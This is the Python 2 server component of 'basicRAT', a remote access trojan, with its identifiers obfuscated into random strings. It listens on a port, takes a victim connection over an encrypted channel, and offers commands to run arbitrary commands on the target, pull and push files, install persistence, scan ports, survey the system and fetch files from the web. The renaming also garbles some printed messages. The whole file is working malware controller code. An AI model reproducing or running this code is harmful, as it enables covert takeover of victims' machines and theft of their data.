#!/usr/bin/env python
# -*- coding: utf-8 -*-
import argparse
import readline
import socket
import struct
import sys
import time
try:
    from core.crypto import YRziRmEPPXlBbFMWPzvDXHZlVuNCrPBT,SKKkrmGLAJRDTUbwjJLaYtKBVMQbZzJS,jkwBfxODkQDCazFRAKanySiAKxsUUphC
    from core.filesock import WyerSerlsTFVDKVjjvmFBBWFhDZeEwrB, mlagwFzeYdHITweNNECIpONaDpUVkCnW
except ImportError as QOLDDPukOCfjUmrGdVkvgkjFXUepMxdI:
    print QOLDDPukOCfjUmrGdVkvgkjFXUepMxdI
    sys.exit(0)
mcNYLVZQjhOfNkaRZGVgshhYgUjChqTR = '''
download <files>    - Download file(s).
help                - Show this help menu.
persistence         - Apply persistence mechanism.
quit                - Gracefully kill client and server.
rekey               - Regenerate crypto key.
run <command>       - Execute a command on the target.
scan <ip>           - Scan top 25 ports on a single host.
survey              - Run a system survey.
unzip <file>        - Unzip a file.
upload <files>      - Upload files(s).
wget <url>          - Download a file from the web.
'''
mEPUWhKCYpHgoqMELfkaWKasjpWgmTQT = '''
______           _     ______  ___ _____   _            _
| ___ \         (_)    | ___ \/ _ \_   _| | |          | |
| |_/ / __ _ ___ _  ___| |_/ / /_\ \| |   | |_ ___  ___| |_
| ___ \/ _` / __| |/ __|    /|  _  || |   | __/ _ \/ __| __|
| |_/ / (_| \__ \ | (__| |\ \| | | || |   | ||  __/\__ \ |_
\____/ \__,_|___/_|\___\_| \_\_| |_/\_/    \__\___||___/\__|
'''
ickAYwLlvtBXHqnGnHOttkSQRMmJniwI = [
            'download', 'help', 'persistence', 'quit', 'rekey',
            'run', 'scan', 'survey', 'unzip', 'upload', 'wget'
]
def bMMPBKcrOAfABtNKKQOXTJXgrUYNfWRb():
    bgZTpLdYKEbPGQGiERiwKjJMfpwVoWbv = argparse.ArgumentParser(description='basicRAT server')
    bgZTpLdYKEbPGQGiERiwKjJMfpwVoWbv.add_argument('-p', '--port', help='Port to listen on.',
                        default=1337, type=int)
    return bgZTpLdYKEbPGQGiERiwKjJMfpwVoWbv
def ZLZjkMMjJUruesRTbCgUukFNoGkpAZiX():
    bgZTpLdYKEbPGQGiERiwKjJMfpwVoWbv  = bMMPBKcrOAfABtNKKQOXTJXgrUYNfWRb()
    XybMaGyjGjkfwTBtJnCuTSVMRsAoQbeA    = vars(bgZTpLdYKEbPGQGiERiwKjJMfpwVoWbv.parse_args())
    ClebRbKvsPkhsSGYCeFDnhFbtUATZUWf    = XybMaGyjGjkfwTBtJnCuTSVMRsAoQbeA['port']
    rknKsknmzbgZguxvPWfDZEbmXwXYtPjR = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        rknKsknmzbgZguxvPWfDZEbmXwXYtPjR.bind(('0.0.0.0', ClebRbKvsPkhsSGYCeFDnhFbtUATZUWf))
    except socket.error:
        print 'Error: Unable to start PRCpieHPxysMjIISVuZIBnRlzYOUGeMe, ClebRbKvsPkhsSGYCeFDnhFbtUATZUWf {} in use?'.format(ClebRbKvsPkhsSGYCeFDnhFbtUATZUWf)
        sys.exit(1)
    for WOPbkdWNfZHJWgRaiCMUuVDVqEZBPCbm in mEPUWhKCYpHgoqMELfkaWKasjpWgmTQT.split('\n'):
        time.sleep(0.05)
        print WOPbkdWNfZHJWgRaiCMUuVDVqEZBPCbm
    print 'basicRAT PRCpieHPxysMjIISVuZIBnRlzYOUGeMe listening on ClebRbKvsPkhsSGYCeFDnhFbtUATZUWf {}...'.format(ClebRbKvsPkhsSGYCeFDnhFbtUATZUWf)
    rknKsknmzbgZguxvPWfDZEbmXwXYtPjR.listen(10)
    mLXIWOduLpKjnBpqqIuligBokLzPHyHG, dSxqqPyMnbKkzDfAJAhDzEmynDLGETRZ = rknKsknmzbgZguxvPWfDZEbmXwXYtPjR.accept()
    GXiCQUHtkzjUHzLgUbEMbFCKAYmtgSPC = jkwBfxODkQDCazFRAKanySiAKxsUUphC(mLXIWOduLpKjnBpqqIuligBokLzPHyHG, PRCpieHPxysMjIISVuZIBnRlzYOUGeMe=True)
    while True:
        jPUsVJIsCURAXNgAmWVSUKSTtUYKROPl = raw_input('\n[{}] basicRAT> '.format(dSxqqPyMnbKkzDfAJAhDzEmynDLGETRZ[0])).rstrip()
        if not jPUsVJIsCURAXNgAmWVSUKSTtUYKROPl:
            continue
        sMjpQxbzmVgxXVjWHsnQzQFwYFTBueky, _, action = jPUsVJIsCURAXNgAmWVSUKSTtUYKROPl.partition(' ')
        if sMjpQxbzmVgxXVjWHsnQzQFwYFTBueky not in ickAYwLlvtBXHqnGnHOttkSQRMmJniwI:
            print 'Invalid command, type "help" to see rGLazmPjwuKkihYLXVFSuAXjQJMYONbU list of commands.'
            continue
        if sMjpQxbzmVgxXVjWHsnQzQFwYFTBueky == 'help':
            print mcNYLVZQjhOfNkaRZGVgshhYgUjChqTR
            continue
        mLXIWOduLpKjnBpqqIuligBokLzPHyHG.send(SKKkrmGLAJRDTUbwjJLaYtKBVMQbZzJS(jPUsVJIsCURAXNgAmWVSUKSTtUYKROPl, GXiCQUHtkzjUHzLgUbEMbFCKAYmtgSPC))
        if sMjpQxbzmVgxXVjWHsnQzQFwYFTBueky == 'quit':
            rknKsknmzbgZguxvPWfDZEbmXwXYtPjR.close()
            sys.exit(0)
        elif sMjpQxbzmVgxXVjWHsnQzQFwYFTBueky == 'run':
            wAKfQEannUHfjCWPIGfBxywNKGVTKbYL = mLXIWOduLpKjnBpqqIuligBokLzPHyHG.recv(4096)
            print YRziRmEPPXlBbFMWPzvDXHZlVuNCrPBT(wAKfQEannUHfjCWPIGfBxywNKGVTKbYL, GXiCQUHtkzjUHzLgUbEMbFCKAYmtgSPC).rstrip()
        elif sMjpQxbzmVgxXVjWHsnQzQFwYFTBueky == 'download':
            for GyWbGsWEWOwmEgmmYXUCzOJvgAWqrOlb in action.split():
                GyWbGsWEWOwmEgmmYXUCzOJvgAWqrOlb = GyWbGsWEWOwmEgmmYXUCzOJvgAWqrOlb.strip()
                WyerSerlsTFVDKVjjvmFBBWFhDZeEwrB(mLXIWOduLpKjnBpqqIuligBokLzPHyHG, GyWbGsWEWOwmEgmmYXUCzOJvgAWqrOlb, GXiCQUHtkzjUHzLgUbEMbFCKAYmtgSPC)
        elif sMjpQxbzmVgxXVjWHsnQzQFwYFTBueky == 'upload':
            for GyWbGsWEWOwmEgmmYXUCzOJvgAWqrOlb in action.split():
                GyWbGsWEWOwmEgmmYXUCzOJvgAWqrOlb = GyWbGsWEWOwmEgmmYXUCzOJvgAWqrOlb.strip()
                mlagwFzeYdHITweNNECIpONaDpUVkCnW(mLXIWOduLpKjnBpqqIuligBokLzPHyHG, GyWbGsWEWOwmEgmmYXUCzOJvgAWqrOlb, GXiCQUHtkzjUHzLgUbEMbFCKAYmtgSPC)
        elif sMjpQxbzmVgxXVjWHsnQzQFwYFTBueky == 'rekey':
            GXiCQUHtkzjUHzLgUbEMbFCKAYmtgSPC = jkwBfxODkQDCazFRAKanySiAKxsUUphC(mLXIWOduLpKjnBpqqIuligBokLzPHyHG, PRCpieHPxysMjIISVuZIBnRlzYOUGeMe=True)
        elif sMjpQxbzmVgxXVjWHsnQzQFwYFTBueky in ['scan', 'survey', 'persistence', 'unzip', 'wget']:
            print 'Running {}...'.format(sMjpQxbzmVgxXVjWHsnQzQFwYFTBueky)
            wAKfQEannUHfjCWPIGfBxywNKGVTKbYL = mLXIWOduLpKjnBpqqIuligBokLzPHyHG.recv(1024)
            print YRziRmEPPXlBbFMWPzvDXHZlVuNCrPBT(wAKfQEannUHfjCWPIGfBxywNKGVTKbYL, GXiCQUHtkzjUHzLgUbEMbFCKAYmtgSPC)
if __name__ == '__main__':
    ZLZjkMMjJUruesRTbCgUukFNoGkpAZiX()
